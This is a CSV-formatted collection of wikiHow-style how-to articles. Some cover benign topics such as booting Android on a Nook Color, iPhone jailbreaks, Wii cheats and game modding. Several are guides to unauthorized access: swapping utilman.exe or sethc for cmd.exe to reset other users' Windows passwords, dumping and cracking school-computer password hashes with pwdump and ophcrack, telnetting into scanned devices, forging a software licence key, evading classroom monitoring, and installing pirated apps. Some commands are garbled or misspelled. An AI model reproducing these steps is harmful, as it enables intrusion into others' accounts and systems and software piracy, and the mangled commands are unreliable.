headline,title,text
"
Caution: Remove all external media from your computer before proceeding.,Open the “Win32 disk imager” program.,

Click the browse button and browse to the image file you extracted to your hard drive earlier.
,





Click the pull down button to select the drive name of your microSD card Caution: (By selecting the write button all information on the selected drive will be deleted).,
Once the writing process has completed eject the microSD card from your computer Note: (Always eject hardware properly using the Windows safe removal tool to avoid corrupting information on the drive.),Plug the microSD card back in to your computer.,
Navigate to the root folder of the microSD card.,

Copy the “Update” file which you downloaded from Cyanogenmod’s website.
,Paste the “Update” file into the root folder of your microSD card.,Eject the microSD card from your computer once the file has finished copying.",How to Run the Android Operating System on a Barnes and Noble Nook Color from a MicroSD Card2," This will prevent you from accidentally overwriting data you want to keep. (eg. flash drives, external hard drives, ipods, mp3 players, digital cameras, etc.)
,,,,
,, The name of the microSD drive should now say “boot” (eg. D:\ is the root folder for drive D)
,,,"
"Insert the microSD card into the Nook color’s microSD slot,
Power on the Nook color (if it is already on, power it down and turn it back on) Note: (You will now see a screen that says loading rather than the “read forever” which was there before.,Turn on the power leaving the microSD card in the Nook color’s microSD slot,The Nook color will now boot into a full Android 2.3 operating system,Have fun.",How to Run the Android Operating System on a Barnes and Noble Nook Color from a MicroSD Card3,", You will see the Nook color open a program that has a picture of a penguin in the upper left corner and it will start running code. This is the updater. Let it run. The Nook color will turn off automatically once it is finished.)
,,,"
"Start iPhone's Safari and go to http://jailbreakme.com.,
At the bottom of jailbreakme.com there will be a button that will say ""Install AppSnapp."",
When you touch ""Install AppSnapp"" Mobile Safari will crash to the home screen.

,
Notice that there will be an icon spinning when you return to the home screen, don't worry!,
Once your iPhone is done installing, it should take you to your lock screen, slide to unlock as always.

,
Now you will see a blue icon on your home screen, proceed by clicking on Installer.

,
Once it opens successfully, you now have access to many downloads for you iPhone, Enjoy!

",How to Jailbreak iPhone V.1.1.1 Using AppSnapp,";
,

,, That just means it's downloading and preparing to install.

,,,"
"
Knowledge: the first step in protecting your data is to understand the nature of what protects it.,
Archiver: What one would need to seek out is an archiver with build in encryption standards.,
Installation/Use: After downloading 7zip run the executable in your default download directory.,
Creating a crack proof archive: The new menu that you opened in step 3 will be the control panel for your new archive.,
Key Strengthening/Archive strength: The strength of your new archive will depend squarely on the password you put into the two fields in the encryption box.",How to Make a Crack Proof Archive," In this article a folder will be compressed to store your information. The only difference between this ""archive"" and others is that this one will have to be protected with an encryption standard. This container will have a password that will link itself to an algorithm. That means that the only feasible way to get into the archive will be to enter the password. Knowing this a concerned user would ask the following questions and receive the following answers:

Q: Is my data safe in this container?
A:The safety of your archive will depend squarely on the algorithm used to secure it. For example; AES-256 is safe, Win-ZIP 8 is not.



 


Q: In its encrypted state, is my data still stable?
A: Normally yes, however some compression standards can and sometimes will make your compressed archive unstable. Such is the nature of some KGB compressed archives and also on rare occasions .rar files. However KGB archives have been confirmed to store 3.2 GB of information in a 64kb file.






Q: Is there a chance that my data will become unrecoverable?
A: This would depend on the compression standard. For the purpose of this article simple ""storage"" based compression is suggested. With very little compression there is very little chance of degradation.





;
, A good example comes forward in 7zip . This free program can protect your data with a 256 bit AES encryption and has the added ability to open a great diversity of archives. Other archivers have similar capabilities however, for a crack proof archive one would need the added security of a government level encryption. For our purposes AES through 7zip will do nicely.

, Click your way through to a clean installation and simply go to your desktop. Use your mouse to right click your desktop. Go to new/folder. This will create a new folder on your desktop. Now right click that folder. You will notice a new option has been added to your right click menu. Go to 7-zip/add to archive. Now the new window will lead directly to step three, creating your crack proof archive.

, Primarily there are three boxes that will need to be changed in order for the encryption to work.

Archive Format: This will need to be changed to ""7z"".






Compression Level: This will need to be changed to ""store"".






The Encryption Box: This is where you will enter your desired information. See step 4.







, AES-256 encryption can be an incredibly weak standard for those who use a weak password. A weak password can be broken in the hours to days margin. A strong one cannot be broken, or at the very least is unfeasible to try to crack. To understand what makes a password weak on must temporarily enter into the world of cracking. AES-256 is strong algorithm and can't be broken in and of itself. However A cracker will use a computer to try every word in one or several dictionaries to see if one of those words is a password to your archive. When that doesn't work he will then try every possible combination of letters to find out what your password is. This method will guarantee success given a certain amount of time and computer power. In fact if your password was 5 digits long it would only take this cracker a year to crack your archive with a single computer. The same process would only take the NSA several minutes. However, if you lengthened your password to 25 digits not even the government would be able to crack your archive in this manner. That is assuming that your new password is a combination of numbers, symbols and letters. That means that you may have to do some memorizing. The only other ways to get your password would be through you, your ram, or through a key logger. The Ram method is the only confirmed weakness in AES and is referred to as a cold boot attack. In short, after one opens their archive the password is saved in your computers ram. If that password were retrieved before five seconds of elapsed off time occurred it is then possible to retrieve the password. In short turn your computer off and data is still roaming around for 5 seconds, that means until that five seconds is over your password is still in there. In the end a strong password is the key to AES strength, to further improve the strength of your archive see the tips and warnings sections bellow.

"
"
Download the 1.1.4 firmware onto your iPhone.,
Download Ziphone.,
After you have downloaded that, you will need to open it.,
Once you click on the icon, it will ask you to unzip, so just click the ""Unzip"" button.

,
A window will open, and on the side, there will be a panel with the words ""Jailbreak"".,
Plug your iPhone into your computer.

,
Your iPhone will show a bunch of words on the screen if you did it correctly.

,
Once it is done, you should have a 1.1.4 Jailbroken Iphone!

",How to Jailbreak a 1.1.4 iPhone," You should already have it downloaded from Apple.;
, Follow the previous link to get there.

, It should automatically, but if not it should be under desktop.

,, Click on it.

,,,"
"
Disable your screen lock.,
Plug in your device.,
Backup your data.,
Disable you backup password (if applicable).Your iTunes backup password must also be disabled during the jailbreak process.,
Download p0sixspwn.,
Right-click on the p0sixspwn file.,
Click the Jailbreak button.,
Unplug your device.,
Run Cydia.",How to Jailbreak iOS 6.1.3 (4th Generation)," If you have a passcode lock on your phone, it must be turned off for the jailbreak process. You can turn it on again once the jailbreak process is complete.


Tap Settings on your home screen.
Tap General.
Scroll down and tap Passcode Lock.
Toggle passcode lock off. You will need to enter the passcode to turn it off.;
, Use the USB cable that came with your device to connect it to a USB port on your computer. iTunes may open automatically. You can leave it open if you are backing up your data in iTunes (see next step), otherwise you can close it.

, Before jailbreaking your phone, it is highly recommended that you backup your data and settings. This will allow you to easily restore your iPhone to its regular state if your jailbreak messes up or you are unhappy with it. You can either backup your data using iTunes or upload the backup to iCloud.



Backup through iTunes. Open iTunes. Open the Summary tab for your device. You can access this by clicking View and then selecting Show Sidebar. Your iPhone will be listed in the left frame of the iTunes window. Click it to open the Device Summary. Click Back Up Now. iTunes will proceed to store your phone’s data in an image file that will be saved on your computer.

You can verify that the backup was successful by clicking preferences and then selecting the Devices tab. You should see your new backup in the list of Device backups.



Backup through iCloud. Open the Settings app on your Home screen. Select iCloud, then Storage & Backup. Slide the iCloud Backup switch to On. Your device will automatically backup when connected to a power source and a wireless network.

You can change what is backed up by clicking Manage Storage. In this screen you can see how large your backup file is, and you can toggle which Apps to backup.



, In iTunes, click on your device and uncheck the “Encrypt Local Backup” box. You will need to enter your password and backup your device.

, This is the jailbreak tool created by the iOS hacking community that will allow you to jailbreak any 6.1.3 to 6.1.5 iOS device. This is an untethered jailbreak, meaning you don’t have to plug it in each time you turn it on.


p0sixspwn is available for free from the developers.
Extract the ZIP file once you download it. You can place the folder anywhere that is easy to access, such as your desktop.

, Select “Run as Administrator” or, if that option is not available, “Open”. The program should open, and your device should be detected and shown in the main window. If your device is not shown, make sure that it is properly connected and that iTunes can detect it.

, Your device will begin jailbreaking automatically, and the progress will be shown in the program. Your device will reboot multiple times during the jailbreak process.

, Once the program tells you that the jailbreak process is complete, you can disconnect your device from your computer. Your device may still reboot a few times as the installation is finalized.

, Now that your jailbreak is complete, you are free to start downloading apps through Cydia and customizing your device. If you ever want to return to the standard version of iOS, restore the device from the backup you made.

"
"
Download and install the Homebrew Channel.,
Download and install the Homebrew Browser.

,
Go to the Wii menu.

,
Start the Homebrew Channel.

,
Start the Homebrew Browser.

,
Wait a while, because it takes a long time to load the first time you start it.

,
At the Homebrew Browser menu, click on the Utilities tab.

,
From here, you can install all the software in the ""Things You'll Need"" section of this how-to that you have not already downloaded and installed.

,
Open The Homebrew Channel and then start the Code Downloader.,
You will be confronted with the names of a bunch of video games for the Wii.,
Once you found the game you want to hack, press the A button and wait.,
Open the Cheat Manager.

,
Select the text file for the cheat codes you just downloaded (yourgame.txt).

,
You should see a list of cheat codes.

,
To the left of the cheat codes, you should see a next to the cheats.,
Once you are done enabling codes, press the 1 button on the Wii remote.,
Make sure that both the game you are hacking and the SD card are in the Wii.

,
Start the Ocarina application.

,
Congratulations, you are now playing a hacked video game.

,
Frequently Asked Questions.",How to Hack Your Wii Games for Free,";
,,,,,,,, Unless your native language is not English, choose NTSC-US.

, Use the up and down directions on the control pad and use the left and right directions to scroll up and down.

, After this is done, you will return to the Homebrew Channel Menu automatically.

,,,, This means that the cheats are disabled. To enable the cheats, click on the plus button on the Wii remote when the cheat is highlighted with the cursor. You navigate through the list the same way you navigated through the list of games in the code downloader.

, Then return to the Wii menu using the Home button.

,,,,


Q. For some reason, it will not let me enable some of the cheats. Why not?

A. Some of the cheats require the user to edit the code to their preferences by editing the hex code where letters in the code are marked XXX or XXXX. This is usually for numerical values.


Q. Why is the game not even starting up when I hack it?

A. In most cases, it is just the cheats that you have used. A lot of cheats just contradict with other cheats.


Q. It won't save any of the cheats as enabled, and won't many people haven't got any of the cheats to work for any game. Just trying to get cheats to work in general.

"
"
When the computer starts up, hold down F8 before you see the ""Windows Starting"" screen.,
Open Notepad and press ""save as"".,
Go down to the bottom and select ""All Files"".

,
Go to where you saved the file, and open it.,
If the computer has Notepad blocked, you can use edit.,
Do as you wish inside command prompt.",How to Hack Windows1," This will bring you to a screen with choices. Your best bet will be ""Safe Mode with Command Prompt"". You can then do as you want.;
, Select all files from the drop down menu. Name the file: ""Something.bat"".

,, This will open up Command Prompt.

, Access this by opening command prompt or command.com and typing edit. Also, you can even use Microsoft Office or something if you can save it right.

, Here is how to add or delete accounts:


Add Account: C:>net user USERNAME /add
Change Accounts password: C:>net user USERNAME * then you'll be able to enter a new password for the account. If you just press enter without typing anything, the account password will be reset.
Delete Account: C:>net local group Administrators# # Another way is to open up notepad, (if it's not blocked), and type in ""command.com"". Then go to File->Save As. A USERNAME /ADD

"
"
Boot the system from the Windows 7 CD.

,
Click on Next.

,
Choose “Repair your computer”.

,
Click Next in the System Recovery window.

,
Choose the Command Prompt option below.

,
In the command prompt window, copy the Seth file to C drive.,
Replace the Seth.exe file with cmd.exe file with following command, and type “yes” to replace the file: ""c:\windows\system32\cmd.exe c:\windows\syetem32\Seth.exe"" (without quotation marks).

,
Type ""exit” to restart the Windows setup.

,
Press the shift key 5 times, rapidly, when you're in the username screen.,
In the command prompt window type the “net user,” “user name” and “password”.",How to Hack Windows2,",,,,, Enter this command: “C:\windows\system32\Seth.exe c:” (without quotation marks).

,,, In the Sticky Keys window, click Yes.

, For example: net user administrator 123

"
"
First, download Greenpois0n.,
Connect your device to your computer.

,
Make sure your device is turned off before running Greenpois0n, it will need to be off for the jailbreak.

,
Run Greenpois0n.

,
Hit the jailbreak button.,
Put your device in DFU mode.,
Wait for Greenpois0n to finish.

,
Your device will reboot.,
Your device will reboot again.

",How to Jailbreak an Ipod or Iphone Using Greenpois0N," It can be downloaded from their website.;
,,,, Greenpois0n will guide you through the jailbreak process.

, Greenpois0n also guides you through this. Your device's screen should flash white.

,, When it completes, you will find the ""Loader"" app on your screen. Open it, and you can install Cydia from here.

,"
"
Download one of the most necessary tools.,
Using Zenmap.,
Start Telnet.,In the telnet box type ""o IPAddressHere PortNumber""

,
You will want to use the IP address that you found port 23 open on.,
Fool around with the device you connected to.",How to Hack Via Telnet," Before you go off hacking, you will need to download a port-scanner. One of the most powerful and free port-scanners is nmap. If possible make sure you install the GUI with it. It comes with the Windows installer.;
, When you download nmap, ""Zenmap GUI"" will also be downloaded along with it. Open this once you find this, put the Internet Protocol (IP) address of the computer you want to hack in the ""Target"" box. Say you want to scan a range of IP addresses, then you would type the beginning IP address followed by (no spaces) a dash ( - ) and the end of the last IP address. For example, if you wanted to scan 192.168.1.100 to 192.168.1.299 then you would type 192.168.1.100-299 . In the ""Profile"" menu of Zenmap, select ""Intense scan"" if it is not already selected. Click scan and watch as the program scans the computer or device for open ports. Watch the nmap output until you see some words in green. These are the open ports on the computer or device. If port 23 is open, the device is hackable, if there is no password set.

, For Windows, click Start -> Run (or Windows Key + R) and type telnet in the box. This will open a telnet screen.

,, If you don't type a port number, it will assume you mean 23. Now hit enter to connect.

, Basically just fool around with the system here.

"
"
Back up all data on your iPhone 4S to iTunes or iCloud.,
Tap on “Settings,” then tap on “Touch ID and Passcode.”
,
Toggle the passcode feature to the “Off” position.,
Swipe up on the screen of your iPhone to open Control Center, then tap on the airplane icon.,Navigate to Pangu’s official website at http://en.pangu.io/.,Select the option to download Pangu software to your Windows or Mac computer.,
Double-click on the Pangu app to open the Pangu tool.,
Connect the iPhone to your computer using a USB cable.,
Click on “Start Jailbreak,” then click on “Already Did” to confirm you’ve already backed up your personal data, disabled the passcode lock feature, and enabled Airplane Mode.,Wait for your iPhone 4S to reboot, and for Pangu to inform you jailbreaking is complete.,
Close Pangu, then disconnect the iPhone from your computer.",How to Jailbreak an iPhone 4S iOS 6.1.31," Jailbreaking will erase all personal data from your device.


Follow these steps to back up your iPhone to iTunes, or go to “Settings” > “iCloud” > “Backup” on your device, and tap on “Back up now.”;
,, The passcode must be disabled for jailbreaking to work successfully., This will enable Airplane Mode on your iPhone, and prevent the phone from receiving phone calls, emails, and texts, which could interfere with the jailbreaking process.,,, If using Windows, right-click on the Pangu tool, and select “Run as administrator.”, Pangu will take a few moments to recognize your device., Pangu will begin the jailbreaking process, which may take several minutes to complete.,, Your device will now be jailbroken, and Cydia will display in the app tray."
"
Back up all data on your iPhone 4S to iTunes or iCloud.,
Tap on “Settings,” then tap on “Touch ID and Passcode.”
,
Toggle the passcode feature to the “Off” position.,
Swipe up on the screen of your iPhone 4S to open Control Center, then tap on the airplane icon.,Navigate to the Evasi0n website at http://evasi0n.com/.,Select the option to download Evasi0n to your Windows or Mac computer.,
Double-click on the Evasi0n app to open the Evasi0n tool.,
Connect the iPhone to your computer using a USB cable.,
Click on “Jailbreak” in Evasi0n to begin the jailbreaking process.,
Unlock your iPhone at the prompt, then tap on the “evasi0n 7” icon.,
Disconnect the iPhone from your computer when Evasi0n informs you jailbreaking is complete.",How to Jailbreak an iPhone 4S iOS 6.1.32," Jailbreaking will erase all personal data from your device.

Go to “Settings” > “iCloud” > “Backup” on your device and tap on “Back up now,” or follow these steps to back up your iPhone using iTunes.

,, The passcode must be disabled for jailbreaking to work successfully., This will enable Airplane Mode on your iPhone, and prevent the phone from receiving phone calls, emails, and texts, which could interfere with the jailbreaking process.,,, If using Windows, right-click on the Evasi0n tool and select “Run as administrator.”, Evasi0n will take a few moments to recognize your device., Jailbreaking will take several minutes to complete, and reboot your iPhone when finished., The screen of your iPhone will turn white, and reboot once again. After rebooting, the screen of your iPhone will display the Evasi0n logo, and proceed with jailbreaking., Cydia will now be displayed in the app tray."
"
Restart the jailbreaking process from the beginning if Pangu or Evasi0n stop working at any time during jailbreaking.,
Exit out of Pangu or Evasi0n and restore your iPhone using iTunes if jailbreaking fails to complete.,
Update to the latest version of iTunes if Pangu or Evasi0n fail to recognize your device.,
Download and install an app called “CrashReporter” from Cydia to help diagnose and troubleshoot problems related to jailbreaking.",How to Jailbreak an iPhone 4S iOS 6.1.33," If your iPhone 4S stops working or reboots into safe mode, follow these steps to perform a hard reset. A hard reset will restore your iPhone back to its original factory settings., This method can help restore your iPhone in the event a hard reset fails to work., In some cases, using an outdated version of iTunes can interfere with the jailbreaking process, especially if new updates have been released for iOS.

Launch iTunes, click on “iTunes,” and select “Check for Updates” to determine whether iTunes needs updating.

, If your iPhone frequently crashes or experiences any other software problems, CrashReporter can help identify the problem and provide a resolution."
"
Download an archiver.,
Find a file to hide.,
Find an innocent file.,
Create a folder for the innocent file and the file that's to be hidden.,
Add the innocent file to the archive.,
Run Command Prompt.,
Get into the root directory.,
Hide the file.,
Get rid of the evidence.,
Access the hidden file.",How to Hide a Folder Inside of a Picture in Your Computer," This can be any program that can archive files, such as 7zip or WinRAR



 ;
, This can be anything such as a text document, a picture, or even a whole folder





, An innocent file is a file that would not look suspicious, such as a picture or text file.





, Make a folder in C:\. We'll be using test.





, Right click the file, and click add to archive.





, Go to the start menu, open Run, and type CMD.





, Type in cd\ and type cd\ test





, Type copy /b + , Delete the remaining files to finish the process





, Open the not-so-innocent file with the archiver (7ZFM for 7zip) to access the hidden file





"
"
In this method we'll hack registry booster by making a registration key.,At first download and install the latest version of Uniblue Registry booster

,Now open Task Manager and end process registrybooster.exe

,Now in startup menu open Run and type regedit and open it

,When Registry editor opens press Ctrl+F

,A dialogue box with ""Find"" will appear where you have to uncheck ""keys"" and ""Data""

,And check ""Match whole string only""

,Then in find what search box type ""FC"" and click Find next button

,
Here registry editor will open a page containing FC file.,name the string ""License""

,now double click the key to open the string then in value box enter your name or your girlfriends name and restart computer and enjoy free full software

",How to Hack Uniblue Registry Booster," It is applicable to all version.;
,,,,,,,, In empty space somewhere right click to select a new String value

,,"
"
Connect the iOS device to your computer using a USB cable.,
Click on your iOS device displayed in the left sidebar of iTunes.

,
Click on “File” at the top of iTunes, then point to “Devices.”

,
Click on “Back Up.” iTunes will back up and save all personal data on your device, since jailbreaking will wipe and erase all personal data.

,
Close iTunes when the backup process is complete.

,
Download and install the correct jailbreak software for your iOS device based on its firmware version.

,
Launch the jailbreak software, then follow the on-screen prompts to jailbreak your device.,
Reopen iTunes when the jailbreaking process is complete.

,
Click on “File,” point to “Devices,” and select “Restore from Backup.” iTunes will restore all personal data to your device, and you can proceed with installing Installous.,
Launch Cydia on your iOS device and tap on “Manage.”

,
Tap on “Sources,” then tap on “Edit.”

,
Tap on “Add,” then type “cydia.hackulo.us” into the URL field.,
Tap on “Add Source,” then tap on the back button to return to the Home screen of Cydia.

,
Tap on “Search,” then execute a search for “Installous.”

,
Tap on “Installous 5” from the list of search results.

,
Tap on “Install,” then tap on “Confirm” to verify you want Installous on your device.

,
Tap on “Restart the Springboard” after installation is complete.

,
Restart your iOS device.",How to Install Installous," iTunes will launch immediately upon recognizing your device.


If your device is already jailbroken, skip to Part Two of this article to install Installous.;
,,,,,, When jailbreaking is complete, Cydia will display in the app tray.

,,,,, This is the source Cydia will use to find and install Installous.,,,,,, Installous will now be displayed in the app tray on your iOS device."
"
Log into Windows using an account with administrator access.,
Open the Command Prompt as an administrator.,
Type .net user and press ↵ Enter.,
Type .net user username * and press ↵ Enter.,
Enter the new password.,
Log in with the new password.",How to Hack Into a Windows User Account Using the Net User Command1," If you can log into Windows with an administrator account, you can easily change the passwords of any other account.


If you are locked out of Windows or don't have access to an administrator account, see the next section.;
, You'll need to do this even if you're already logged in with an account that has administrator access.


Windows 7 and earlier - Open the Start menu, right-click on ""Command Prompt,"" and select ""Run as administrator."" Confirm that you want to open the Command Prompt.
Windows 8 and later - Right-click on the Windows button and select ""Command Prompt (Admin)."" Confirm when prompted by User Account Control.

, This will display a list of user accounts on the computer. The accounts will be listed in columns based on their permissions level.

, You will be prompted to create a new password for username.

, You will have to enter the password twice to confirm it. The new password will take effect immediately.

, You can use the password you just created to log into that user's account. Log out of your current session and log in with the new password.

"
"
Make sure you have downloaded the game (and that you're not playing the game right off the internet).,
Go to where you have installed it.

,
You should now be inside the Need for Madness folder.,
Open the music folder.

,
There will be several files called zip files.,
Also if you open it as an archive, and drag the mod file to another window, you will notice that it is really an MPEG file.,
Click on the stages folder.,
Name(n)- n is the name of the track.,
n laps(l)- l is the number of laps in the track.

,
set(a,b,c,d)e -creates a track piece.,
--------------------------- NFM2 only -----------------------------




43 = Long, dirt track with bumpy edges
44 = Long, dirt track going from bumpy to normal
45 = Half paved bump without end wall
46 = Paved tunnel
47 = Long, paved track with starting blocks
48 = Long, dirt track with starting blocks


chk(a,b,c,d)x- creates a checkpoint.,
Note: When setting a track piece the x-coordinate and y-coordinate refer to the centre of the piece.,The track file seems happy to accept comments if preceded by a hash eg # a comment

",How to Hack Need for Madness," This can be done at www.arcadetown.com(go to racing games and choose Need for Madness, press download now).;
,, To change music, go to step 4. To change stage laps, go to step 6.

,, These are the compressed files for each stage (you can obviously see that). To change music files use WinZip, IZArc, or another unzipping program to open it. You can also right-click and select Extract all... then go through the steps to extract it. Now, you should see music files inside them in mod format. So if you wanted to make stage 4 music be stage 5 music, you would copy the file in it and paste it in stage 5 folder and rename it to ""stage5.mod"". Be sure to delete the original file. If you want to change it by a music that is not existing there then you can use a mod converter to convert it to mod and then rename it to stage#.mod and add it to the zip file. If it asks to replace the file then do so., If you can find the right kind of MPEG to convert a video to (the audio part of the MPEG), then you can put in your own music.

, Each stage is saved in a text file written in a special script. To edit a stage, open that stage's text file. Here is a list of the commands (note: the letters a, b, c, etc. are what you change):

, It appears near the beginning of each file.

,, a is the piece type, b is the x-coordinate (from your starting point), c is the y-coordinate (from your starting point), d is the rotation (in degrees), and e tells the computer controlled cars what type of piece it is (type p for a straight piece, pr for a jump, pt for a turn, ph for a quarter pipe, etc.) The types are




0 = Tornado Shark statue
1 = Formula 7 statue
2 = Wow Caninaro statue
3 = La Vite Crab statue
4 = Nimi statue
5 = MAX Revenge statue
6 = Lead Oxide statue
8 = Radical One statue
9 = DR Monstaa statue
10 = Long, paved track
11 = Long, paved track with walls
12 = Long, paved track at an angle to the right
13 = Long, paved track at an angle to the left
14 = Paved track with a right curve
15 = Long, dirt track
16 = Long, grass track
17 = Dirt track with a right curve
18 = Long, dusty paved track
19 = Dusty paved track with a right curve
20 = Long, track going from dirt to paved
21 = Medium length track going from dirt to paved
22 = Short, track going from paved to dusty paved
23 = Short, paved track with an end facing back
24 = Short, dirt track with an end facing front
25 = Paved, track segment
26 = Medium sized, ramp
27 = Medium sized, paved ramp with walls
28 = Full, paved bump
29 = Half bump: low and high
30 = Paved bump; half
31 = Large, paved ramp
32 = Small, paved ramp
33 = Dirt ""speed bump""
34 = Medium dirt ramp
35 = Small dirt ramp
36 = Paved Quarter-pipe
37 = Spikes
38 = Fake Checkpoint(Hurdle)
39 = Fake track border segment
40 = Blue Checkpoint
41 = Fixing Loop
42 = Black Checkpoint



, Works the same way as set.
fix(a,b,c,d,e)x- creates an electrified hoop. Same as for set and chk, except that d is the height(it has to be negative) and e is the rotation.

, A #10 straight is 2400 wide by 5600 high. A #14 turn is 4200 by 4200 (discovered by trial and error). Alternatively you can divide the coordinate system by 800 in planning and use 2x7 and 4x4 respectively.

,"
"
Find or create a Windows installation disc.,
Insert the disc or drive in the computer you want to access.,
Reboot the computer and open the BIOS or BOOT menu.,
Select your installation disc or USB drive as the primary boot device.,
Reboot and start Windows Setup.,
Select your language and input options.,
Click the ""Repair your computer"" button in the lower-left corner.,
Select the Windows installation you want access to.,
Select ""Command Prompt"" from the System Recovery Options menu.,
Enter the commands to gain access to the Command Prompt from the Login menu.,
Remove the installation disc and reboot.,
Press .⊞ Win+U at the Windows Login screen.,
Type .net user and press ↵ Enter.,
Type .net user username * and press ↵ Enter.,
Create a new password.,
Log into the user's account with the new password.",How to Hack Into a Windows User Account Using the Net User Command2," If you don't have access to any administrator accounts on the computer, you can use a Windows installation disc as a workaround. This requires the same version disc for the version of Windows you are trying to access. The disc doesn't have to be the one that came with the computer.If you have an ISO copy of the Windows installation disc, you can burn it to a blank DVD or put it on a bootable USB drive. See Install Windows 7 Using Pen Drive for more detailed instructions on creating a bootable USB drive with Windows installation files.

, You'll be using the installation disc to access the administrator controls to change users' passwords.

, This needs to be done before the Windows logo appears, and the process varies slightly depending on what version of Windows the computer is running:


Windows 7 and earlier - Press the BIOS, SEUP, or BOOT key as the computer is starting up. The key varies by manufacturer, and will be displayed on the boot-up logo screen. Common keys include: F2, F10, F11, and Del. Once you've opened the BIOS or SETUP menu, select the BOOT or BOOT ORDER option.
Windows 8 and later - Open the Start menu or Screen and right-click the Power button. Hold ⇧ Shift and click ""Restart."" Choose the ""Troubleshoot"" option, then ""Advanced options."" Select the ""UEFI Firmware Settings"" option from the menu. Open the BOOT menu.

, The exact process will vary, but generally you'll just reassign the numbers so that the computer boots from the disc or USB drive before the hard drive. Some BIOS software refers to this as the ""Boot Order"" and you will often see a menu option to ""Change Boot Order"". Don't be surprised if you find that that the CD drive is already set as the first drive in the order. If this is the case, you don't need to change anything in the BIOS, SETUP or BOOT sequence.

, Press a key to launch the Windows Setup program and let the files load. This may take a minute or so.

, You can usually just leave these at their default settings.

, This can be found on the same screen as the ""Install now"" button.

, There will usually only be one option on this list.

, This will open the Command Prompt in a new window.

, The following commands will allow you to access the Command Prompt from the Windows Login screen. This will allow you to change the password of any account. Enter the following commands, in order:



cd\ ↵ Enter


cd windows\system32 ↵ Enter


ren utilman.exe utilman.exe.bak ↵ Enter


copy cmd.exe utilman.exe ↵ Enter


, Now that you've made your necessary changes, you can reboot the computer and start changing passwords. Take out the disc or drive before rebooting so that the computer boots normally.

, This would normally launch the Accessibility Manager, but since you made the changes to the system files, Command Prompt will launch instead.


Press Alt+Tab ↹ if nothing appears right away. It may be hidden behind the login screen.

, A list of accounts on the computer will be displayed. Administrators are listed in the left column, regular accounts in the middle, and guest accounts on the right.

, Replace username with the account you want to gain access to.

, Type a new password when prompted and again to confirm. You may want to consider completely erasing the password by simply pressing ↵ Enter on each line, as this may be less suspicious than creating a password the user doesn't recognize later.

, The new password will take effect immediately, so you can switch back to the Windows Login screen and use the password to access the account.

"
"Open Cheat Engine and Calculator

,Go to BunnyGames.com

,Find the game Ultimate tactics

,
Open Windows List in Cheat Engine and choose Ultimate Tactics if ur Ie or select Firefox if ur Firefox.

",How to Hack Ultimate Tactics1,",,,"
"
Once the teacher has enabled ""Show Student"" press ctrl-alt-delete to bring up the screen that has the buttons to get to the task manager, lock computer, etc.,While that is open, press esc multiple times while releasing ctrl-alt-delete to ensure you hit it right as the menu is disappearing

,press ctrl-alt-delete once again and you will have control of the computer's mouse for 2-3 seconds

",How to Hack Lanschool1,";
,,"
"
Enter a battle and look at your HP.,
Move around until the enemy gets to you, now times the hp u have by 8 now type that into CE and hit scan.

,
There should be one value box left.,
If you want to use it on mana attacks just do the same as above but just keep using mana then freeze it.

",How to Hack Ultimate Tactics2," Now, use the calculator and times it by 8 and enter it in the value box. Hit First Scan.;
,, Double click it, and change the value to 2000000000 and then freeze it.


Variation Mana Hack: Repeat the above steps, but use your energy numbers instead of HP.

,"
"
click on status while in a battle find the exp you have.Ex.exp 200 out of 300 do 200 times 8 and you'll get 160 put that in cheat engine that's the example so do that for the first one.

,
kill a monster and see how much exp you have now times that by 8 and put the number in cheat engine and hit next scan.

,
after that click on the remaining address and freeze it with however much experience you want.,
freeze


you must do this for all your characters for each slot you have a character in.

",How to Hack Ultimate Tactics3,",,(Don't do something like a million I did 200k and put on the 500xSpeed hack got up to like 4000Lvl and then changed it down to a low exp and just left it you keep the level though.)

,"
"first step is get a your old weapon and d equip that and then times the number you have for str by 8 and put it in cheat engine first scan

,now time the number you have now by 8 and put in cheat engine and then hit next scan

,
what you basically want to do is all that for magic and everything you have.

",How to Hack Ultimate Tactics4,",,"
"
Download ""pwdump"" to the computer that you are using.,
Right click in any folder and then New>Text Document.

,Open it and type ""command.com""

,
File>Save As and save it as something.bat.

,
Double click on something.bat.

,
Navigate to the pwdump folder using CD the location of pwdump.

,
Type ""pwdump.exe -o hashes.txt localhost"" (without quotes) and email hashes.txt to yourself or put it on your thumb drive.

,
On your own computer Google-install ophcrack and follow one of the guides.

,Click load pwdump file and locate the text file to load the hashes

,
And you cracked the administrator.

",How to Hack Into a School Computer1," If the site is blocked then you should download it to a thumb drive and put it in the computer.;
,,,,,,,,,"
